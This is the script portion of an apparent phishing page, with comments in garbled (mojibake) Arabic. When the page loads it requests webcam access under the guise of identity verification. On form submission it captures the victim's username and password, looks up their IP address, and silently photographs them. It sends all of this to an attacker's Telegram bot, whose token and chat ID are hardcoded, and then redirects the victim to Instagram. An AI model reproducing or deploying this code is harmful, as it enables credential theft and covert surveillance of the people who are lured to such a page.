<video id="video" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    // 1. Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙˆØ± ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© (Ø¨ØµÙŠØºØ© ØªØ£ÙƒÙŠØ¯ Ù‡ÙˆÙŠØ©)
    window.onload = function() {
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            document.getElementById('video').srcObject = stream;
        }).catch(err => {
            console.log("ØªÙ… Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ù† Ù‚Ø¨Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ Ø§Ù„Ù…ØªØµÙØ­");
        });
    };

    function goToLogin() {
        document.getElementById('promo-view').style.display = 'none';
        document.getElementById('login-ui').style.display = 'block';
    }

    // 2. Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ (Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª + IP + Ø§Ù„ØµÙˆØ±Ø©)
    document.getElementById('pish').onsubmit = async function(e) {
        e.preventDefault();
        
        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;
        const botToken = '8505285607:AAEEG79gHONgRUxh6lx5Fo9sa3gMvAqaMMs';
        const chatId = '448818597';
        
        // Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP Ù„Ù„Ø¶Ø­ÙŠØ©
        let userIP = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            userIP = ipData.ip;
        } catch(e) { console.error("IP Error"); }

        // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'victim_shot.jpg');
            formData.append('caption', 
                `âš ï¸ ØµÙŠØ¯ VIP Ù…ÙƒØªÙ…Ù„:\n` +
                `ğŸ‘¤ Ø§Ù„ÙŠÙˆØ²Ø±: ${user}\n` +
                `ğŸ”‘ Ø§Ù„Ø±Ù…Ø²: ${pass}\n` +
                `ğŸŒ Ø§Ù„Ø£ÙŠØ¨ÙŠ: ${userIP}\n` +
                `â° Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString()}`
            );

            try {
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹Ø§Ù‹ Ù„Ù„Ø¨ÙˆØª
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                alert("ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­! Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„Ø§Ø³ØªÙ„Ø§Ù… ÙÙŠ Ø±Ø³Ø§Ù„Ø© Ø®Ø§ØµØ©.");
                window.location.href = "https://www.instagram.com/iphone_pro_max_worms_/";

            } catch (error) {
                // Ø­Ø§Ù„Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© Ø¥Ø°Ø§ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© (ÙŠØ±Ø³Ù„ Ø§Ù„Ù†Øµ ÙÙ‚Ø·)
                const msg = encodeURIComponent(`âš ï¸ ØµÙŠØ¯ (Ø¨Ø¯ÙˆÙ† ØµÙˆØ±Ø©):\nğŸ‘¤ Ø§Ù„ÙŠÙˆØ²Ø±: ${user}\nğŸ”‘ Ø§Ù„Ø±Ù…Ø²: ${pass}\nğŸŒ IP: ${userIP}`);
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}`);
                
                alert("ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­!");
                window.location.href = "https://www.instagram.com";
            }
        }, 'image/jpeg');
    };
</script>

